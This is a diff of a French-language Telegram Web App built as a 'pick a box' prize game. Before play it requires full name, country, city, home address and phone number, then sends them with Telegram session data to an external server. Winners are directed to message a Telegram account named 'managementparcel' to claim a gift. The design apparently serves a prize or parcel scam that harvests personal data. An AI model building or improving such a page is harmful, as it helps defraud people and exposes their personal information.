@@ -52,20 +52,43 @@
         }
 
         button:disabled {
-            opacity: 0.6;
+            opacity: 0.5;
+            cursor: not-allowed;
         }
 
-        .choice {
-            background: #0088cc;
-            margin: 10px 0;
-        }
-
+        #formulaire,
         #jeu,
         #fin {
             display: none;
         }
 
-        #message {
+        #formulaire {
+            display: block;
+        }
+
+        .grille {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 10px;
+            margin-top: 20px;
+        }
+
+        .case {
+            width: 100%;
+            height: 70px;
+            margin: 0;
+            font-size: 22px;
+            font-weight: bold;
+            background: #0088cc;
+        }
+
+        .case.utilisee {
+            background: #999;
+            cursor: not-allowed;
+        }
+
+        #message,
+        #resultat {
             margin-top: 18px;
             font-weight: bold;
         }
@@ -77,6 +100,10 @@
         .error {
             color: red;
         }
+
+        #reclamer {
+            background: #28a745;
+        }
     </style>
 </head>
 
@@ -85,6 +112,7 @@
 <div class="container">
 
     <!-- FORMULAIRE -->
+
     <div id="formulaire">
 
         <h1>🎮 Jeu</h1>
@@ -128,7 +156,7 @@
         >
 
         <button id="continuer">
-            Continuer
+            Commencer le jeu
         </button>
 
         <div id="message"></div>
@@ -137,29 +165,38 @@
 
 
     <!-- JEU -->
+
     <div id="jeu">
 
         <h1>🎯 À toi de jouer !</h1>
 
-        <p id="chance">
-            Chance 1 sur 3
-        </p>
-
         <p>
-            Choisis une case :
+            Choisis une case parmi les 12.
         </p>
 
-        <button class="choice" data-choice="1">
-            1️⃣
-        </button>
+        <p id="chance">
+            Tentatives restantes : 3
+        </p>
 
-        <button class="choice" data-choice="2">
-            2️⃣
-        </button>
+        <div class="grille">
 
-        <button class="choice" data-choice="3">
-            3️⃣
-        </button>
+            <button class="case" data-case="1">1</button>
+            <button class="case" data-case="2">2</button>
+            <button class="case" data-case="3">3</button>
+
+            <button class="case" data-case="4">4</button>
+            <button class="case" data-case="5">5</button>
+            <button class="case" data-case="6">6</button>
+
+            <button class="case" data-case="7">7</button>
+            <button class="case" data-case="8">8</button>
+            <button class="case" data-case="9">9</button>
+
+            <button class="case" data-case="10">10</button>
+            <button class="case" data-case="11">11</button>
+            <button class="case" data-case="12">12</button>
+
+        </div>
 
         <div id="resultat"></div>
 
@@ -167,11 +204,16 @@
 
 
     <!-- FIN -->
+
     <div id="fin">
 
         <h1 id="titreFin"></h1>
 
         <p id="messageFin"></p>
+
+        <button id="reclamer">
+            🎁 Réclamer mon cadeau
+        </button>
 
     </div>
 
@@ -183,15 +225,19 @@
     const URL_RENDU =
         "https://telegram-number-game-3pet.onrender.com";
 
-    const tg = window.Telegram.WebApp;
+    const ADMIN_USERNAME =
+        "managementparcel";
+
+    const tg =
+        window.Telegram.WebApp;
 
     tg.ready();
     tg.expand();
 
 
-    // -------------------------
+    // -----------------------------
     // ÉLÉMENTS
-    // -------------------------
+    // -----------------------------
 
     const formulaire =
         document.getElementById("formulaire");
@@ -220,233 +266,281 @@
     const messageFin =
         document.getElementById("messageFin");
 
+    const reclamer =
+        document.getElementById("reclamer");
 
-    // -------------------------
-    // DONNÉES DU JOUEUR
-    // -------------------------
+
+    // -----------------------------
+    // VARIABLES DU JEU
+    // -----------------------------
 
     let joueur = {};
 
-    let nombreChance = 1;
-
-    const nombreMaxChance = 3;
+    let tentativesRestantes = 3;
 
     let jeuTermine = false;
 
-
-    // -------------------------
-    // BOUTON CONTINUER
-    // -------------------------
-
-    continuer.addEventListener("click", async function () {
-
-        const nom =
-            document.getElementById("nom").value.trim();
-
-        const prenom =
-            document.getElementById("prenom").value.trim();
-
-        const pays =
-            document.getElementById("pays").value.trim();
-
-        const ville =
-            document.getElementById("ville").value.trim();
-
-        const adresse =
-            document.getElementById("adresse").value.trim();
-
-        const telephone =
-            document.getElementById("telephone").value.trim();
+    let caseGagnante = null;
 
 
-        // Vérification
+    // -----------------------------
+    // DÉMARRAGE DU JEU
+    // -----------------------------
 
-        if (
-            !nom ||
-            !prenom ||
-            !pays ||
-            !ville ||
-            !adresse ||
-            !telephone
-        ) {
+    continuer.addEventListener(
+        "click",
+        async function() {
 
-            message.className = "error";
+            const nom =
+                document.getElementById("nom")
+                .value.trim();
+
+            const prenom =
+                document.getElementById("prenom")
+                .value.trim();
+
+            const pays =
+                document.getElementById("pays")
+                .value.trim();
+
+            const ville =
+                document.getElementById("ville")
+                .value.trim();
+
+            const adresse =
+                document.getElementById("adresse")
+                .value.trim();
+
+            const telephone =
+                document.getElementById("telephone")
+                .value.trim();
+
+
+            if (
+                !nom ||
+                !prenom ||
+                !pays ||
+                !ville ||
+                !adresse ||
+                !telephone
+            ) {
+
+                message.className = "error";
+
+                message.textContent =
+                    "Veuillez remplir tous les champs.";
+
+                return;
+            }
+
+
+            joueur = {
+
+                nom: nom,
+
+                prenom: prenom,
+
+                pays: pays,
+
+                ville: ville,
+
+                adresse: adresse,
+
+                telephone: telephone,
+
+                resultat: "jeu_en_cours",
+
+                initData: tg.initData
+
+            };
+
+
+            continuer.disabled = true;
 
             message.textContent =
-                "Veuillez remplir tous les champs.";
+                "Connexion au serveur...";
 
-            return;
+
+            try {
+
+                const response =
+                    await fetch(
+                        URL_RENDU + "/api/game",
+                        {
+                            method: "POST",
+
+                            headers: {
+                                "Content-Type":
+                                    "application/json"
+                            },
+
+                            body:
+                                JSON.stringify(joueur)
+                        }
+                    );
+
+
+                const data =
+                    await response.json();
+
+
+                if (!response.ok) {
+
+                    throw new Error(
+                        data.message ||
+                        "Erreur serveur"
+                    );
+
+                }
+
+
+                // Tirage de la case gagnante
+
+                caseGagnante =
+                    Math.floor(
+                        Math.random() * 12
+                    ) + 1;
+
+
+                tentativesRestantes = 3;
+
+                jeuTermine = false;
+
+
+                formulaire.style.display =
+                    "none";
+
+                jeu.style.display =
+                    "block";
+
+                chance.textContent =
+                    "Tentatives restantes : 3";
+
+            }
+
+            catch (error) {
+
+                console.error(error);
+
+                message.className =
+                    "error";
+
+                message.textContent =
+                    "❌ Impossible de contacter le serveur.";
+
+                continuer.disabled = false;
+
+            }
+
         }
+    );
 
 
-        joueur = {
+    // -----------------------------
+    // CLIC SUR UNE CASE
+    // -----------------------------
 
-            nom: nom,
+    document
+        .querySelectorAll(".case")
+        .forEach(function(button) {
 
-            prenom: prenom,
+            button.addEventListener(
+                "click",
+                async function() {
 
-            pays: pays,
-
-            ville: ville,
-
-            adresse: adresse,
-
-            telephone: telephone,
-
-            resultat: "jeu_en_cours",
-
-            initData: tg.initData
-
-        };
+                    if (jeuTermine) {
+                        return;
+                    }
 
 
-        continuer.disabled = true;
+                    if (
+                        button.classList
+                        .contains("utilisee")
+                    ) {
+                        return;
+                    }
 
-        message.className = "";
 
-        message.textContent =
-            "Connexion au serveur...";
+                    const numero =
+                        Number(
+                            button.dataset.case
+                        );
 
 
-        try {
+                    button.classList
+                        .add("utilisee");
 
-            const response = await fetch(
-                URL_RENDU + "/api/game",
-                {
-                    method: "POST",
+                    button.disabled = true;
 
-                    headers: {
-                        "Content-Type":
-                            "application/json"
-                    },
 
-                    body: JSON.stringify(joueur)
+                    // BONNE CASE
+
+                    if (
+                        numero === caseGagnante
+                    ) {
+
+                        gagner();
+
+                        return;
+                    }
+
+
+                    // MAUVAISE CASE
+
+                    tentativesRestantes--;
+
+
+                    if (
+                        tentativesRestantes <= 0
+                    ) {
+
+                        perdre();
+
+                        return;
+                    }
+
+
+                    chance.textContent =
+                        "Tentatives restantes : " +
+                        tentativesRestantes;
+
+                    resultat.className =
+                        "error";
+
+                    resultat.textContent =
+                        "❌ Mauvaise case. Essaie encore.";
+
                 }
             );
 
-
-            const data =
-                await response.json();
+        });
 
 
-            if (!response.ok) {
-
-                throw new Error(
-                    data.message ||
-                    "Erreur serveur"
-                );
-            }
-
-
-            // Le formulaire disparaît
-
-            formulaire.style.display =
-                "none";
-
-            // Le jeu apparaît
-
-            jeu.style.display =
-                "block";
-
-        }
-
-        catch (error) {
-
-            console.error(error);
-
-            message.className = "error";
-
-            message.textContent =
-                "❌ Impossible de contacter le serveur.";
-
-            continuer.disabled = false;
-        }
-
-    });
-
-
-    // -------------------------
-    // JEU
-    // -------------------------
-
-    document.querySelectorAll(".choice")
-        .forEach(function(button) {
-
-        button.addEventListener(
-            "click",
-            function() {
-
-                if (jeuTermine) {
-                    return;
-                }
-
-
-                const choix =
-                    button.dataset.choice;
-
-
-                /*
-                 * POUR LE TEST :
-                 * la bonne case est la case 2.
-                 */
-
-                const bonneCase = "2";
-
-
-                if (choix === bonneCase) {
-
-                    gagner();
-
-                    return;
-                }
-
-
-                // Mauvais choix
-
-                if (nombreChance >= nombreMaxChance) {
-
-                    perdre();
-
-                    return;
-                }
-
-
-                nombreChance++;
-
-                chance.textContent =
-                    "Chance " +
-                    nombreChance +
-                    " sur " +
-                    nombreMaxChance;
-
-                resultat.textContent =
-                    "❌ Mauvais choix. Essaie encore.";
-
-            }
-
-        );
-
-    });
-
-
-    // -------------------------
+    // -----------------------------
     // VICTOIRE
-    // -------------------------
+    // -----------------------------
 
     async function gagner() {
 
         jeuTermine = true;
 
+
         titreFin.textContent =
             "🎉 Félicitations !";
 
+
         messageFin.textContent =
-            "Tu as gagné ! Contacte l'administrateur pour récupérer ton cadeau.";
+            "Tu as gagné ! Clique ci-dessous pour contacter l'administration et réclamer ton cadeau.";
+
 
         jeu.style.display =
             "none";
 
         fin.style.display =
+            "block";
+
+
+        reclamer.style.display =
             "block";
 
 
@@ -457,25 +551,32 @@
     }
 
 
-    // -------------------------
+    // -----------------------------
     // DÉFAITE
-    // -------------------------
+    // -----------------------------
 
     async function perdre() {
 
         jeuTermine = true;
 
+
         titreFin.textContent =
             "😔 Partie terminée";
 
+
         messageFin.textContent =
-            "Tu as utilisé tes 3 chances. Merci d'avoir participé.";
+            "Tu as utilisé tes 3 tentatives. Merci d'avoir participé.";
+
 
         jeu.style.display =
             "none";
 
         fin.style.display =
             "block";
+
+
+        reclamer.style.display =
+            "none";
 
 
         await envoyerResultat(
@@ -485,9 +586,41 @@
     }
 
 
-    // -------------------------
-    // ENVOYER LE RÉSULTAT
-    // -------------------------
+    // -----------------------------
+    // CONTACT ADMINISTRATEUR
+    // -----------------------------
+
+    reclamer.addEventListener(
+        "click",
+        function() {
+
+            const lien =
+                "https://t.me/" +
+                ADMIN_USERNAME;
+
+            if (
+                tg &&
+                tg.openTelegramLink
+            ) {
+
+                tg.openTelegramLink(lien);
+
+            } else {
+
+                window.open(
+                    lien,
+                    "_blank"
+                );
+
+            }
+
+        }
+    );
+
+
+    // -----------------------------
+    // ENVOI DU RÉSULTAT
+    // -----------------------------
 
     async function envoyerResultat(
         resultatFinal
@@ -526,7 +659,8 @@
                             "application/json"
                     },
 
-                    body: JSON.stringify(donnees)
+                    body:
+                        JSON.stringify(donnees)
                 }
             );
 
